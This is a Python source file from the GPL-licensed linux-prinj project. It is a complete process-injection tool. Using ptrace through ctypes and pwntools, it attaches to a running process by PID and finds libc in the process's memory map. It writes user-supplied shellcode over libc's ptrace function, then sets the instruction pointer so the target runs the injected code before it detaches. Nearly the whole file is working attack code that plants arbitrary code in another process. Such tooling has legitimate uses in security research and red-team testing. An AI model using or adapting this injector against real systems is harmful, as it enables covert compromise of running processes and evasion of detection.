#!/usr/bin/env python3
#
# This file is part of the linux-prinj project.
# https://gitlab.com/pgregoire/linux-prinj/
#
# Copyright 2022 Philippe Grégoire <git@pgregoire.xyz>
#
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#

import ctypes

from pwn import *


context.log_level = 'critical'

# -------------------------------------------------------------------- #
# ptrace

libc = None
def loadlibc(path):
    global libc


    if libc is None:
        libc = ctypes.CDLL(path)

        # ptrace's signature
        libc.ptrace.argtypes = [
            ctypes.c_uint64,
            ctypes.c_uint64,
            ctypes.c_void_p,
            ctypes.c_void_p,
        ]
        libc.ptrace.restype = ctypes.c_uint64


class UserRegsStruct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]


def ptrace_attach(pid):
    return libc.ptrace(16, pid, 0, 0)


def ptrace_detach(pid):
    return libc.ptrace(17, pid, 0, 0)


def ptrace_getregs(pid):
    r = UserRegsStruct()
    e = libc.ptrace(12, pid, 0, ctypes.byref(r))
    assert(0 == e)
    return r


def ptrace_setregs(pid, regs):
    e = libc.ptrace(13, pid, 0, ctypes.byref(regs))
    assert(0 == e)


def ptrace_peektext(pid, addr):
    return libc.ptrace(1, pid, addr, 0)


def ptrace_poketext(pid, addr, value):
    return libc.ptrace(4, pid, addr, value)


def ptrace_singlestep(pid):
    libc.ptrace(9, pid, 0, 0)


# helpers
def attach(pid):
    ptrace_attach(pid)
    os.waitpid(pid, 0)


def singlestep(pid):
    ptrace_singlestep(pid)
    os.waitpid(pid, 0)


def wrmem(pid, addr, dat):
    pad = lambda s : (s + (b'\x00' * (8 - (len(dat) % 8))))[:8]

    for i in range(0, len(dat), 8):
        z = u64(pad(dat[i:i+8]))
        ptrace_poketext(pid, addr+i, z)

# -------------------------------------------------------------------- #

def findlibc(pid):
    with open('/proc/{}/maps'.format(pid)) as fp:
        maps = fp.read()

    return  [l for l in maps.split('\n') if '/libc' in l][0]


if 3 != len(sys.argv):
    print('usage: inject <shellcode.bin> <pid>', file=sys.stderr)
    exit(1)

with open(sys.argv[1], 'rb') as fp:
    code = fp.read()
pid = int(sys.argv[2])


libc_map = findlibc(pid)
libc_path = libc_map.split()[-1]

loadlibc(libc_path)
elf_libc = ELF(libc_path)
elf_proc = ELF('/proc/{}/exe'.format(pid))

# find a large unused function
for sym in ['ptrace']:
    if 'ptrace' in elf_proc.symbols:
        continue

    print('Replacing {}'.format(sym))

    sym_addr = int(libc_map.split('-')[0], 16) + elf_libc.symbols[sym]

    try:
        print('Performing injection')
        attach(pid)

        regs = ptrace_getregs(pid)
        wrmem(pid, sym_addr, p64(regs.rip - 2))
        wrmem(pid, sym_addr+8, code)
        regs.rip = sym_addr + 8 + 2
        ptrace_setregs(pid, regs)

    finally:
        print('Resuming process')
        ptrace_detach(pid)
        break
